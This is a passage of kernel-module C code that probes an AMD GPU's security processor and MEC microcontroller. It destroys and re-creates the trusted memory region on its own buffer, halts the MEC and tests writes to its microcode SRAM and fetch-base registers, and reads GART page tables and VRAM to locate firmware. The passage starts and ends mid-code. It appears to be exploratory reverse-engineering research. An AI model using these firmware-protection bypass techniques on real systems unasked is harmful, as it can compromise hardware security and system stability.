	 * Firmware entries at 0x97FF8XXXXX and 0x97FFAXXXXX.
	 * MEC firmware is 447456 bytes = 0x6D3E0 bytes.
	 *
	 * Let's also probe the TMR kaddr from adev[+0x3BAA0] */
	{
		u64 tmr_gpu  = *(u64 *)((u8 *)adev + 0x3BAA0);
		u64 tmr_bo   = (i >= 8) ? *(u64 *)((u8 *)adev + 0x3BA98) : 0;

		pr_info("fw36: TMR GPU addr = 0x%llX, TMR BO = 0x%llX\n",
			tmr_gpu, tmr_bo);

		/* The big firmware BO: adev[+0x44AF8] = 0x97FF800000
		 * kaddr = 0xFFFFCF9F3F800000, +16 = 0x09002C01
		 * 0x09002C01 might encode fw count and total size */
		{
			u64 fw_bo_gpu = *(u64 *)((u8 *)adev + 0x44AF8);
			u64 fw_bo_ka  = *(u64 *)((u8 *)adev + 0x44B00);
			u64 fw_meta   = *(u64 *)((u8 *)adev + 0x44B08);

			pr_info("fw36: FW BO: GPU=0x%llX kaddr=0x%llX meta=0x%llX\n",
				fw_bo_gpu, fw_bo_ka, fw_meta);

			if ((fw_bo_ka & 0xFFFF000000000000ULL) == 0xFFFF000000000000ULL) {
				u32 *fw = (u32 *)(unsigned long)fw_bo_ka;
				int off;
				pr_info("fw36: FW BO first 128 bytes:\n");
				for (off = 0; off < 32; off += 4)
					pr_info("fw36:   [0x%03X] %08X %08X %08X %08X\n",
						off*4, fw[off], fw[off+1], fw[off+2], fw[off+3]);

				/* Scan first 1MB for MEC header signature */
				pr_info("fw36: Scanning FW BO for MEC header...\n");
				for (off = 0; off < 0x100000/4; off += 1024) {
					if (fw[off] == 0x0006D3E0 ||
					    (fw[off+1] == 0x0000003C && fw[off+2] == 0x00000002)) {
						pr_info("fw36: *** MEC HEADER at FW_BO+0x%X: %08X %08X %08X %08X ***\n",
							off*4, fw[off], fw[off+1], fw[off+2], fw[off+3]);
						/* Dump 256 bytes around it */
						{
							int k;
							for (k = 0; k < 16; k += 4)
								pr_info("fw36:   [+%02d] %08X %08X %08X %08X\n",
									k, fw[off+k], fw[off+k+1],
									fw[off+k+2], fw[off+k+3]);
						}
					}
				}
			}
		}
	}

	/* Now submit AUTOLOAD_RLC to check current behavior */
	cmd = (u32 *)(unsigned long)cmd_va;
	fence_ptr = (u32 *)(unsigned long)fence_va;
	seqno = *(u32 *)((u8 *)psp + 0x1e0);

	pr_info("fw36: Submitting AUTOLOAD_RLC...\n");
	memset(cmd, 0, 0x1000);
	cmd[2] = 14;  /* AUTOLOAD_RLC */

	ret = psp_submit_and_wait(psp, cmd, cmd_mc, fence_mc,
				  fence_ptr, &seqno);
	pr_info("fw36: AUTOLOAD_RLC: ret=%d status=0x%08X\n",
		ret, cmd[0x360/4]);

	pr_info("fw36: Post-autoload MEC: PC=0x%04X CNTL=0x%08X\n",
		rr(regCP_MEC1_INSTR_PNTR), rr(regCP_MEC_CNTL));
}

/* Mode 7: DESTROY_TMR then SETUP_TMR with our own memory */
static void destroy_setup_tmr(void *psp, void *adev)
{
	u64 cmd_mc   = *(u64 *)((u8 *)psp + 0x1d0);
	u64 cmd_va   = *(u64 *)((u8 *)psp + 0x1d8);
	u64 fence_va = *(u64 *)((u8 *)psp + 0x1c0);
	u64 fence_mc = *(u64 *)((u8 *)psp + 0x1b8);
	u32 *cmd, *fence_ptr, seqno;
	int ret;

	pr_info("fw36: === MODE 7: DESTROY_TMR + SETUP_TMR ===\n");
	if (!cmd_va || !fence_va || !psp_ring_submit) return;

	cmd = (u32 *)(unsigned long)cmd_va;
	fence_ptr = (u32 *)(unsigned long)fence_va;
	seqno = *(u32 *)((u8 *)psp + 0x1e0);

	/* First: DESTROY_TMR (cmd_id=7) — already confirmed SUCCESS in sweep */
	memset(cmd, 0, 0x1000);
	cmd[2] = 7;  /* DESTROY_TMR */
	ret = psp_submit_and_wait(psp, cmd, cmd_mc, fence_mc,
				  fence_ptr, &seqno);
	pr_info("fw36: DESTROY_TMR: ret=%d status=0x%08X\n",
		ret, cmd[0x360/4]);

	if (ret != 0 || cmd[0x360/4] != 0) {
		pr_info("fw36: DESTROY_TMR failed, aborting\n");
		return;
	}

	/* Now try SETUP_TMR with our own DMA buffer.
	 * SETUP_TMR layout (from driver):
	 * cmd[6] = buf_phy_addr_lo  (TMR base address)
	 * cmd[7] = buf_phy_addr_hi
	 * cmd[8] = buf_size
	 * cmd[9] = bitfield (TMR flags)
	 */
	{
		size_t tmr_size = 4 * 1024 * 1024;  /* 4MB — minimum TMR */
		dma_addr_t tmr_dma;
		void *tmr_buf;

		tmr_buf = dma_alloc_coherent(&g_pdev->dev, tmr_size,
					     &tmr_dma, GFP_KERNEL);
		if (!tmr_buf) {
			pr_info("fw36: Failed to alloc TMR buffer (%zu)\n", tmr_size);
			/* Try to re-setup original TMR */
			memset(cmd, 0, 0x1000);
			cmd[2] = 5;  /* SETUP_TMR */
			ret = psp_submit_and_wait(psp, cmd, cmd_mc, fence_mc,
						  fence_ptr, &seqno);
			pr_info("fw36: SETUP_TMR (recovery): ret=%d status=0x%08X\n",
				ret, cmd[0x360/4]);
			return;
		}

		memset(tmr_buf, 0, tmr_size);
		pr_info("fw36: TMR buffer: VA=%p, dma=0x%llX, size=%zuMB\n",
			tmr_buf, (u64)tmr_dma, tmr_size / (1024*1024));

		/* Try SETUP_TMR with our buffer */
		memset(cmd, 0, 0x1000);
		cmd[2] = 5;  /* SETUP_TMR */
		cmd[6] = (u32)((u64)tmr_dma & 0xFFFFFFFF);
		cmd[7] = (u32)((u64)tmr_dma >> 32);
		cmd[8] = (u32)tmr_size;

		ret = psp_submit_and_wait(psp, cmd, cmd_mc, fence_mc,
					  fence_ptr, &seqno);
		pr_info("fw36: SETUP_TMR (ours): ret=%d status=0x%08X\n",
			ret, cmd[0x360/4]);

		if (ret == 0 && cmd[0x360/4] == 0) {
			pr_info("fw36: *** SETUP_TMR SUCCEEDED with our buffer! ***\n");
			pr_info("fw36: TMR is now under our control at 0x%llX\n",
				(u64)tmr_dma);
			/* Don't free — keep TMR active */
		} else {
			pr_info("fw36: SETUP_TMR with custom buffer failed\n");
			/* Recovery: re-setup TMR with no params (let PSP use defaults) */
			memset(cmd, 0, 0x1000);
			cmd[2] = 5;
			ret = psp_submit_and_wait(psp, cmd, cmd_mc, fence_mc,
						  fence_ptr, &seqno);
			pr_info("fw36: SETUP_TMR (recovery, no params): ret=%d status=0x%08X\n",
				ret, cmd[0x360/4]);
			dma_free_coherent(&g_pdev->dev, tmr_size, tmr_buf, tmr_dma);
		}
	}
}

/* Mode 8: Direct MEC SRAM read/write via MMIO — bypass PSP entirely */
static void mec_sram_rw(void *psp, void *adev)
{
	u32 rs64_cntl, old_cntl, pc, ucode_val;
	int i;

	pr_info("fw36: === MODE 8: DIRECT MEC SRAM ACCESS (BYPASS PSP) ===\n");

	/* Step 1: Read current RS64 MEC control state */
	rs64_cntl = rr(regCP_MEC_RS64_CNTL);
	old_cntl = rs64_cntl;
	pc = rr(regCP_MEC1_INSTR_PNTR);
	pr_info("fw36: RS64_CNTL = 0x%08X, PC = 0x%04X\n", rs64_cntl, pc);
	pr_info("fw36: MEC_HALT=%u PIPE0_ACTIVE=%u PIPE0_RESET=%u ICACHE_INV=%u\n",
		(rs64_cntl >> 30) & 1, (rs64_cntl >> 26) & 1,
		(rs64_cntl >> 16) & 1, (rs64_cntl >> 4) & 1);

	/* Read RS64 program counter start */
	pr_info("fw36: PRGRM_CNTR_START = 0x%08X_%08X\n",
		rr(regCP_MEC_RS64_PRGRM_CNTR_START_HI),
		rr(regCP_MEC_RS64_PRGRM_CNTR_START));
	pr_info("fw36: MDBASE = 0x%08X_%08X\n",
		rr(regCP_MEC_MDBASE_HI), rr(regCP_MEC_MDBASE_LO));
	pr_info("fw36: MIBOUND = 0x%08X_%08X\n",
		rr(regCP_MEC_MIBOUND_HI), rr(regCP_MEC_MIBOUND_LO));
	pr_info("fw36: IC_BASE = 0x%08X_%08X\n",
		rr(regCP_CPC_IC_BASE_HI), rr(regCP_CPC_IC_BASE_LO));
	pr_info("fw36: DC_BASE_CNTL = 0x%08X, DC_OP_CNTL = 0x%08X\n",
		rr(regCP_MEC_DC_BASE_CNTL), rr(regCP_MEC_DC_OP_CNTL));
	pr_info("fw36: EXCEPTION_STATUS = 0x%08X\n",
		rr(regCP_MEC_RS64_EXCEPTION_STATUS));

	/* Step 2: Read first 16 words of MEC microcode SRAM */
	pr_info("fw36: --- MEC Instruction SRAM (pre-halt) ---\n");
	wr(regCP_MEC_ME1_UCODE_ADDR, 0);
	for (i = 0; i < 16; i++) {
		ucode_val = rr(regCP_MEC_ME1_UCODE_DATA);
		pr_info("fw36: ISRAM[%04X] = 0x%08X\n", i, ucode_val);
	}

	/* Read around current PC */
	pr_info("fw36: --- ISRAM around PC=0x%04X ---\n", pc);
	if (pc > 2) {
		wr(regCP_MEC_ME1_UCODE_ADDR, pc - 2);
		for (i = 0; i < 8; i++) {
			ucode_val = rr(regCP_MEC_ME1_UCODE_DATA);
			pr_info("fw36: ISRAM[%04X] = 0x%08X%s\n",
				pc - 2 + i, ucode_val,
				(pc - 2 + i == pc) ? " <-- PC" : "");
		}
	}

	/* Step 3: Read first 16 words of MEC data SRAM */
	pr_info("fw36: --- MEC Data SRAM (pre-halt) ---\n");
	for (i = 0; i < 16; i++) {
		wr(regCP_MEC_DM_INDEX_ADDR, i * 4);
		pr_info("fw36: DSRAM[%04X] = 0x%08X\n", i, rr(regCP_MEC_DM_INDEX_DATA));
	}

	/* Step 4: HALT MEC */
	pr_info("fw36: === HALTING MEC ===\n");
	rs64_cntl = rr(regCP_MEC_RS64_CNTL);
	rs64_cntl |= (1U << CP_MEC_RS64_CNTL__MEC_HALT__SHIFT);           /* halt */
	rs64_cntl |= (1U << CP_MEC_RS64_CNTL__MEC_PIPE0_RESET__SHIFT);   /* reset pipes */
	rs64_cntl |= (1U << CP_MEC_RS64_CNTL__MEC_PIPE1_RESET__SHIFT);
	rs64_cntl |= (1U << CP_MEC_RS64_CNTL__MEC_PIPE2_RESET__SHIFT);
	rs64_cntl |= (1U << CP_MEC_RS64_CNTL__MEC_PIPE3_RESET__SHIFT);
	rs64_cntl |= (1U << CP_MEC_RS64_CNTL__MEC_INVALIDATE_ICACHE__SHIFT); /* inv icache */
	wr(regCP_MEC_RS64_CNTL, rs64_cntl);
	udelay(100);

	pr_info("fw36: Post-halt RS64_CNTL = 0x%08X, PC = 0x%04X\n",
		rr(regCP_MEC_RS64_CNTL), rr(regCP_MEC1_INSTR_PNTR));

	/* Step 5: Read ISRAM again after halt */
	pr_info("fw36: --- MEC ISRAM (post-halt) ---\n");
	wr(regCP_MEC_ME1_UCODE_ADDR, 0);
	for (i = 0; i < 8; i++) {
		ucode_val = rr(regCP_MEC_ME1_UCODE_DATA);
		pr_info("fw36: ISRAM[%04X] = 0x%08X\n", i, ucode_val);
	}

	/* Step 6: Try WRITE to ISRAM — the critical test! */
	pr_info("fw36: === ATTEMPTING ISRAM WRITE ===\n");
	{
		u32 test_addr = 0x0000;  /* Write to address 0 */
		u32 test_val  = 0xDEADBEEF;
		u32 readback;

		/* Read original value */
		wr(regCP_MEC_ME1_UCODE_ADDR, test_addr);
		u32 orig = rr(regCP_MEC_ME1_UCODE_DATA);
		pr_info("fw36: ISRAM[%04X] original = 0x%08X\n", test_addr, orig);

		/* Write test pattern */
		wr(regCP_MEC_ME1_UCODE_ADDR, test_addr);
		wr(regCP_MEC_ME1_UCODE_DATA, test_val);

		/* Read back */
		wr(regCP_MEC_ME1_UCODE_ADDR, test_addr);
		readback = rr(regCP_MEC_ME1_UCODE_DATA);
		pr_info("fw36: ISRAM[%04X] after write = 0x%08X (wanted 0x%08X)\n",
			test_addr, readback, test_val);

		if (readback == test_val) {
			pr_info("fw36: *** ISRAM WRITE SUCCEEDED — MEC SRAM IS WRITABLE! ***\n");

			/* Restore original value */
			wr(regCP_MEC_ME1_UCODE_ADDR, test_addr);
			wr(regCP_MEC_ME1_UCODE_DATA, orig);

			/* Verify restore */
			wr(regCP_MEC_ME1_UCODE_ADDR, test_addr);
			readback = rr(regCP_MEC_ME1_UCODE_DATA);
			pr_info("fw36: ISRAM[%04X] restored = 0x%08X\n", test_addr, readback);
		} else if (readback == orig) {
			pr_info("fw36: ISRAM write IGNORED — register is read-only (PSP locked)\n");
		} else {
			pr_info("fw36: ISRAM readback UNEXPECTED — might be auto-increment issue\n");
			/* Try write-then-immediate-read without re-setting addr */
			wr(regCP_MEC_ME1_UCODE_ADDR, 0x100);
			wr(regCP_MEC_ME1_UCODE_DATA, 0xCAFEBABE);
			wr(regCP_MEC_ME1_UCODE_ADDR, 0x100);
			readback = rr(regCP_MEC_ME1_UCODE_DATA);
			pr_info("fw36: ISRAM[0100] write 0xCAFEBABE, read 0x%08X\n", readback);
		}
	}

	/* Step 7: Try DSRAM write */
	pr_info("fw36: === ATTEMPTING DSRAM WRITE ===\n");
	{
		u32 test_addr = 0x100;  /* Offset into data SRAM */
		u32 orig, readback;

		wr(regCP_MEC_DM_INDEX_ADDR, test_addr);
		orig = rr(regCP_MEC_DM_INDEX_DATA);
		pr_info("fw36: DSRAM[%04X] original = 0x%08X\n", test_addr, orig);

		wr(regCP_MEC_DM_INDEX_ADDR, test_addr);
		wr(regCP_MEC_DM_INDEX_DATA, 0xBAADF00D);

		wr(regCP_MEC_DM_INDEX_ADDR, test_addr);
		readback = rr(regCP_MEC_DM_INDEX_DATA);
		pr_info("fw36: DSRAM[%04X] after write = 0x%08X (wanted 0xBAADF00D)\n",
			test_addr, readback);

		if (readback == 0xBAADF00D) {
			pr_info("fw36: *** DSRAM WRITE SUCCEEDED — DATA SRAM IS WRITABLE! ***\n");
			/* Restore */
			wr(regCP_MEC_DM_INDEX_ADDR, test_addr);
			wr(regCP_MEC_DM_INDEX_DATA, orig);
		} else {
			pr_info("fw36: DSRAM write FAILED or read-only\n");
		}
	}

	/* Step 8: Try writing IC_BASE and MDBASE — redirect MEC fetch */
	pr_info("fw36: === ATTEMPTING IC_BASE/MDBASE REDIRECT ===\n");
	{
		u32 ic_lo, ic_hi, md_lo, md_hi, pc_lo, pc_hi;
		u32 ic_lo_new, ic_hi_new, md_lo_new, md_hi_new;

		ic_lo = rr(regCP_CPC_IC_BASE_LO);
		ic_hi = rr(regCP_CPC_IC_BASE_HI);
		md_lo = rr(regCP_MEC_MDBASE_LO);
		md_hi = rr(regCP_MEC_MDBASE_HI);
		pc_lo = rr(regCP_MEC_RS64_PRGRM_CNTR_START);
		pc_hi = rr(regCP_MEC_RS64_PRGRM_CNTR_START_HI);

		pr_info("fw36: IC_BASE  = 0x%08X_%08X\n", ic_hi, ic_lo);
		pr_info("fw36: MDBASE   = 0x%08X_%08X\n", md_hi, md_lo);
		pr_info("fw36: PC_START = 0x%08X_%08X\n", pc_hi, pc_lo);

		/* Try write IC_BASE_LO with test pattern */
		wr(regCP_CPC_IC_BASE_LO, 0x12345000);
		ic_lo_new = rr(regCP_CPC_IC_BASE_LO);
		pr_info("fw36: IC_BASE_LO write 0x12345000 → read 0x%08X %s\n",
			ic_lo_new, ic_lo_new == 0x12345000 ? "WRITABLE!" : "locked");

		/* Try write IC_BASE_HI */
		wr(regCP_CPC_IC_BASE_HI, 0x00000099);
		ic_hi_new = rr(regCP_CPC_IC_BASE_HI);
		pr_info("fw36: IC_BASE_HI write 0x00000099 → read 0x%08X %s\n",
			ic_hi_new, ic_hi_new == 0x00000099 ? "WRITABLE!" : "locked");

		/* Restore IC_BASE */
		wr(regCP_CPC_IC_BASE_LO, ic_lo);
		wr(regCP_CPC_IC_BASE_HI, ic_hi);

		/* Try write MDBASE */
		wr(regCP_MEC_MDBASE_LO, 0xABCD0000);
		md_lo_new = rr(regCP_MEC_MDBASE_LO);
		pr_info("fw36: MDBASE_LO write 0xABCD0000 → read 0x%08X %s\n",
			md_lo_new, md_lo_new == 0xABCD0000 ? "WRITABLE!" : "locked");

		wr(regCP_MEC_MDBASE_HI, 0x00000042);
		md_hi_new = rr(regCP_MEC_MDBASE_HI);
		pr_info("fw36: MDBASE_HI write 0x00000042 → read 0x%08X %s\n",
			md_hi_new, md_hi_new == 0x00000042 ? "WRITABLE!" : "locked");

		/* Restore MDBASE */
		wr(regCP_MEC_MDBASE_LO, md_lo);
		wr(regCP_MEC_MDBASE_HI, md_hi);

		/* Try write PC_START */
		wr(regCP_MEC_RS64_PRGRM_CNTR_START, 0x00001000);
		pr_info("fw36: PC_START write 0x00001000 → read 0x%08X %s\n",
			rr(regCP_MEC_RS64_PRGRM_CNTR_START),
			rr(regCP_MEC_RS64_PRGRM_CNTR_START) == 0x00001000 ? "WRITABLE!" : "locked");

		/* Restore PC_START */
		wr(regCP_MEC_RS64_PRGRM_CNTR_START, pc_lo);
		wr(regCP_MEC_RS64_PRGRM_CNTR_START_HI, pc_hi);

		/* Also try DC_BASE_CNTL and IC_BASE_CNTL */
		{
			u32 dc_cntl = rr(regCP_MEC_DC_BASE_CNTL);
			u32 ic_cntl = rr(regCP_CPC_IC_BASE_CNTL);
			wr(regCP_MEC_DC_BASE_CNTL, dc_cntl | 0x01);
			pr_info("fw36: DC_BASE_CNTL write +0x01 → read 0x%08X (was 0x%08X)\n",
				rr(regCP_MEC_DC_BASE_CNTL), dc_cntl);
			wr(regCP_MEC_DC_BASE_CNTL, dc_cntl);

			wr(regCP_CPC_IC_BASE_CNTL, ic_cntl | 0x01);
			pr_info("fw36: IC_BASE_CNTL write +0x01 → read 0x%08X (was 0x%08X)\n",
				rr(regCP_CPC_IC_BASE_CNTL), ic_cntl);
			wr(regCP_CPC_IC_BASE_CNTL, ic_cntl);
		}

		/* Try writing MIBOUND — controls instruction memory boundary */
		{
			u32 mi_lo = rr(regCP_MEC_MIBOUND_LO);
			u32 mi_hi = rr(regCP_MEC_MIBOUND_HI);
			wr(regCP_MEC_MIBOUND_LO, 0xFFFFF);
			pr_info("fw36: MIBOUND_LO write 0xFFFFF → read 0x%08X (was 0x%08X)\n",
				rr(regCP_MEC_MIBOUND_LO), mi_lo);
			wr(regCP_MEC_MIBOUND_LO, mi_lo);
			wr(regCP_MEC_MIBOUND_HI, mi_hi);
		}
	}

	/* Step 9: Resume MEC — clear halt, reset, and icache invalidation */
	pr_info("fw36: === RESUMING MEC ===\n");
	rs64_cntl = old_cntl;  /* Restore original control value */
	/* Ensure halt=0, pipe_reset=0, icache_inv=0, pipe_active=1 */
	rs64_cntl &= ~(1U << CP_MEC_RS64_CNTL__MEC_HALT__SHIFT);
	rs64_cntl &= ~(1U << CP_MEC_RS64_CNTL__MEC_PIPE0_RESET__SHIFT);
	rs64_cntl &= ~(1U << CP_MEC_RS64_CNTL__MEC_PIPE1_RESET__SHIFT);
	rs64_cntl &= ~(1U << CP_MEC_RS64_CNTL__MEC_PIPE2_RESET__SHIFT);
	rs64_cntl &= ~(1U << CP_MEC_RS64_CNTL__MEC_PIPE3_RESET__SHIFT);
	rs64_cntl &= ~(1U << CP_MEC_RS64_CNTL__MEC_INVALIDATE_ICACHE__SHIFT);
	rs64_cntl |= (1U << CP_MEC_RS64_CNTL__MEC_PIPE0_ACTIVE__SHIFT);
	rs64_cntl |= (1U << CP_MEC_RS64_CNTL__MEC_PIPE1_ACTIVE__SHIFT);
	rs64_cntl |= (1U << CP_MEC_RS64_CNTL__MEC_PIPE2_ACTIVE__SHIFT);
	rs64_cntl |= (1U << CP_MEC_RS64_CNTL__MEC_PIPE3_ACTIVE__SHIFT);
	wr(regCP_MEC_RS64_CNTL, rs64_cntl);
	udelay(100);

	pr_info("fw36: Post-resume RS64_CNTL = 0x%08X, PC = 0x%04X\n",
		rr(regCP_MEC_RS64_CNTL), rr(regCP_MEC1_INSTR_PNTR));
}

/* GCVM registers (all BASE_IDX=0, direct access) */
#define regGCVM_CONTEXT0_PAGE_TABLE_BASE_ADDR_LO32  0x168f
#define regGCVM_CONTEXT0_PAGE_TABLE_BASE_ADDR_HI32  0x1690
#define regGCVM_CONTEXT0_PAGE_TABLE_START_ADDR_LO32 0x1691
#define regGCVM_CONTEXT0_PAGE_TABLE_START_ADDR_HI32 0x1692
#define regGCVM_CONTEXT0_PAGE_TABLE_END_ADDR_LO32   0x1693
#define regGCVM_CONTEXT0_PAGE_TABLE_END_ADDR_HI32   0x1694
#define regGCVM_CONTEXT0_CNTL                        0x1624
#define regGCVM_L2_CNTL                              0x15c4
#define regGCVM_L2_CNTL2                             0x15c5
#define regGCVM_L2_CNTL3                             0x15c6
#define regGCVM_INVALIDATE_ENG0_REQ                  0x15e6
#define regGCVM_INVALIDATE_ENG0_ACK                  0x15f2

/* Mode 9: GPUVM page table probe — find and manipulate MEC firmware PTE */
static u32 find_gc_base0(void *adev)
{
	int off;
	for (off = 0; off < 0x80000; off += 4) {
		u32 lo = *(u32 *)((u8 *)adev + off);
		u32 hi = *(u32 *)((u8 *)adev + off + 4);
		if (hi == lo + 1 && lo > 0x1000 && lo < 0x10000) {
			u32 base_cand = lo - 0x168f;
			u32 cntl_off = *(u32 *)((u8 *)adev + off + 20);
			if (cntl_off == base_cand + 0x1624)
				return base_cand;
		}
	}
	return 0;
}

static void gpuvm_probe(void *psp, void *adev)
{
	u64 pt_base, gart_start, gart_end, ic_base;
	u64 fb_base, fb_top, sys_lo, sys_hi;
	u32 ctx0_cntl;
	u32 gc_base0;

	pr_info("fw36: === MODE 9: GPUVM PAGE TABLE PROBE (CORRECTED) ===\n");

	gc_base0 = find_gc_base0(adev);
	if (!gc_base0) {
		pr_info("fw36: FAILED to find GC BASE_IDX=0.\n");
		return;
	}
	pr_info("fw36: GC BASE_IDX=0 = 0x%X\n", gc_base0);

	#define GC0(r) (gc_base0 + (r))

	/* PT_BASE (0x168f/0x1690) — correct, already validated */
	pt_base = ((u64)rr(GC0(0x1690)) << 32) | rr(GC0(0x168f));

	/* CORRECT START/END registers (0x16af/0x16b0, 0x16cf/0x16d0) */
	gart_start = ((u64)rr(GC0(0x16b0)) << 32) | rr(GC0(0x16af));
	gart_end   = ((u64)rr(GC0(0x16d0)) << 32) | rr(GC0(0x16cf));

	ctx0_cntl = rr(GC0(0x1624));

	/* FB_LOCATION registers */
	fb_base = (u64)rr(GC0(0x1614)) << 24;
	fb_top  = (u64)rr(GC0(0x1615)) << 24;

	/* System aperture */
	sys_lo = (u64)rr(GC0(0x1619)) << 18;
	sys_hi = (u64)rr(GC0(0x161a)) << 18;

	/* IC_BASE */
	ic_base = ((u64)rr(regCP_CPC_IC_BASE_HI) << 32) | rr(regCP_CPC_IC_BASE_LO);

	pr_info("fw36: PT_BASE        = 0x%016llX\n", pt_base);
	pr_info("fw36: GART_START     = 0x%016llX (VA 0x%llX)\n",
		gart_start, gart_start << 12);
	pr_info("fw36: GART_END       = 0x%016llX (VA 0x%llX)\n",
		gart_end, gart_end << 12);
	pr_info("fw36: CTX0_CNTL      = 0x%08X (depth=%u, en=%u)\n",
		ctx0_cntl, (ctx0_cntl >> 1) & 0x7, ctx0_cntl & 1);
	pr_info("fw36: FB_LOCATION    = [0x%llX - 0x%llX]\n", fb_base, fb_top);
	pr_info("fw36: SYS_APERTURE   = [0x%llX - 0x%llX]\n", sys_lo, sys_hi);
	pr_info("fw36: IC_BASE        = 0x%016llX\n", ic_base);
	pr_info("fw36: L2_CNTL        = 0x%08X\n", rr(GC0(0x15c4)));
	pr_info("fw36: IC_BASE_CNTL   = 0x%08X\n", rr(regCP_CPC_IC_BASE_CNTL));

	/* Check IC_BASE vs GART range */
	{
		u64 gs = gart_start << 12;
		u64 ge = gart_end << 12;
		if (gs == 0 && ge == 0)
			pr_info("fw36: GART range is ZERO — previous reading was wrong regs\n");
		if (ic_base >= gs && ic_base <= ge)
			pr_info("fw36: IC_BASE IS within GART [0x%llX-0x%llX]!\n", gs, ge);
		else
			pr_info("fw36: IC_BASE NOT in GART [0x%llX-0x%llX]\n", gs, ge);
	}

	/* Also dump the OLD wrong registers for comparison */
	{
		u64 old_start = ((u64)rr(GC0(0x1692)) << 32) | rr(GC0(0x1691));
		u64 old_end   = ((u64)rr(GC0(0x1694)) << 32) | rr(GC0(0x1693));
		pr_info("fw36: OLD regs 0x1691/2 = 0x%016llX (were read as GART_START)\n", old_start);
		pr_info("fw36: OLD regs 0x1693/4 = 0x%016llX (were read as GART_END)\n", old_end);
	}

	/* Find GART kernel VA by scanning adev for table pointer */
	{
		u64 gart_ptr = 0;
		u64 gs_page = gart_start;  /* already in page units */
		u64 ic_page = ic_base >> 12;
		u64 rel_page;
		int off;

		/* Scan for GART struct: kptr with table_size nearby */
		for (off = 0x100; off < 0x80000; off += 8) {
			u64 val = *(u64 *)((u8 *)adev + off);
			if ((val >> 48) == 0xFFFF && val != 0xFFFFFFFFFFFFFFFFULL) {
				u32 prev32 = *(u32 *)((u8 *)adev + off - 4);
				if (prev32 >= 0x80000 && prev32 <= 0x4000000 &&
				    (prev32 & 0xFFF) == 0) {
					pr_info("fw36: GART candidate adev+0x%X: "
						"ptr=0x%llX tbl_size=0x%X\n",
						off, val, prev32);
					if (!gart_ptr)
						gart_ptr = val;
				}
			}
		}

		if (!gart_ptr) {
			pr_info("fw36: No GART kernel VA found\n");
			goto skip_pte;
		}

		rel_page = ic_page - gs_page;
		pr_info("fw36: IC_BASE page=0x%llX start_page=0x%llX rel=0x%llX\n",
			ic_page, gs_page, rel_page);
		pr_info("fw36: PTE byte offset = 0x%llX\n", rel_page * 8);

		/* Read PTE for IC_BASE and neighbors */
		{
			void *pte_addr = (void *)((unsigned long)gart_ptr + rel_page * 8);
			u64 pte;
			int k;

			if (rel_page * 8 > 0x4000000) {
				pr_info("fw36: PTE offset 0x%llX beyond table — skipping\n",
					rel_page * 8);
				goto skip_pte;
			}

			if (copy_from_kernel_nofault(&pte, pte_addr, 8) != 0) {
				pr_info("fw36: PTE read FAULT at %p\n", pte_addr);
				goto skip_pte;
			}

			pr_info("fw36: PTE[IC_BASE] = 0x%016llX (Valid=%llu Phys=0x%llX)\n",
				pte, pte & 1, pte & 0xFFFFFFFFF000ULL);

			/* Dump neighborhood */
			for (k = -4; k <= 4; k++) {
				u64 p;
				void *a = (void *)((unsigned long)gart_ptr + (rel_page + k) * 8);
				if (copy_from_kernel_nofault(&p, a, 8) == 0 && p != 0) {
					pr_info("fw36: PTE[%+d] = 0x%016llX phys=0x%llX %s\n",
						k, p, p & 0xFFFFFFFFF000ULL,
						(p & 1) ? "VALID" : "inv");
				}
			}

			/* If PTE is valid, compute MC physical of firmware */
			if (pte & 1) {
				u64 fw_mc_phys = pte & 0xFFFFFFFFF000ULL;
				pr_info("fw36: *** IC_BASE PTE VALID! FW MC phys = 0x%llX ***\n",
					fw_mc_phys);
				pr_info("fw36: FW is at MC phys 0x%llX, FB_BASE=0x%llX\n",
					fw_mc_phys, fb_base);
				if (fw_mc_phys >= fb_base && fw_mc_phys < fb_top)
					pr_info("fw36: FW is within FB (VRAM offset 0x%llX)\n",
						fw_mc_phys - fb_base);
			}
		}
	}

skip_pte:
	/* Scan adev for mec_fw_gpu_addr to confirm IC_BASE source */
	{
		int off;
		pr_info("fw36: Scanning adev for IC_BASE value (mec_fw_gpu_addr)...\n");
		for (off = 0; off < 0x80000; off += 8) {
			u64 val = *(u64 *)((u8 *)adev + off);
			if (val == ic_base) {
				u64 prev = *(u64 *)((u8 *)adev + off - 8);
				u64 next = *(u64 *)((u8 *)adev + off + 8);
				pr_info("fw36: IC_BASE match at adev+0x%X: "
					"[-8]=0x%llX [+8]=0x%llX\n",
					off, prev, next);
				/* next might be the kaddr of the firmware BO */
				if ((next >> 48) == 0xFFFF)
					pr_info("fw36: *** POSSIBLE FW KADDR = 0x%llX ***\n", next);
			}
		}
	}

	#undef GC0
}

/* Mode 11: Scan VRAM for firmware using amdgpu_device_vram_access */
typedef void (*fn_vram_access)(void *adev, loff_t pos, void *buf, size_t size, bool write);

static void vram_fw_scan(void *psp, void *adev)
{
	fn_vram_access vram_access;
	unsigned long va_addr;
	u32 gc_base0, buf[16];
	u64 ic_base, fb_base, fb_top, vram_size, tmr_mc;
	u64 scan_off;
	int i, found = 0;
	/* MEC firmware code signature — first 4 dwords at file offset 0x2000 */
	const u32 fw_sig[4] = {0x04070663, 0x00060663, 0x6F826583, 0x3CB22023};

	pr_info("fw36: === MODE 11: VRAM FIRMWARE SCAN ===\n");

	va_addr = klookup("amdgpu_device_vram_access");
	if (!va_addr) {
		pr_info("fw36: amdgpu_device_vram_access not found!\n");
		return;
	}
	vram_access = (fn_vram_access)va_addr;
	pr_info("fw36: amdgpu_device_vram_access = 0x%lX\n", va_addr);

	gc_base0 = find_gc_base0(adev);
	if (!gc_base0) return;

	#define GC0(r) (gc_base0 + (r))
	ic_base = ((u64)rr(regCP_CPC_IC_BASE_HI) << 32) | rr(regCP_CPC_IC_BASE_LO);
	fb_base = (u64)rr(GC0(0x1614)) << 24;
	fb_top  = (u64)rr(GC0(0x1615)) << 24;
	#undef GC0

	vram_size = fb_top - fb_base;
	tmr_mc = 0x97E0000000ULL;
	pr_info("fw36: IC_BASE=0x%llX FB=[0x%llX-0x%llX] VRAM=%lluMB\n",
		ic_base, fb_base, fb_top, vram_size >> 20);

	/* 1) Read first 64 bytes at VRAM offset 0 (sanity check) */
	vram_access(adev, 0, buf, 64, false);
	pr_info("fw36: VRAM[0x0]: %08X %08X %08X %08X\n",
		buf[0], buf[1], buf[2], buf[3]);

	/* 2) Read near TMR base (VRAM offset = TMR_MC - FB_BASE) */
	{
		u64 tmr_voff = tmr_mc - fb_base;
		pr_info("fw36: TMR VRAM offset = 0x%llX\n", tmr_voff);
		for (i = -4; i <= 4; i++) {
			u64 off = tmr_voff + (i * 0x1000);
			if (off < vram_size) {
				vram_access(adev, off, buf, 64, false);
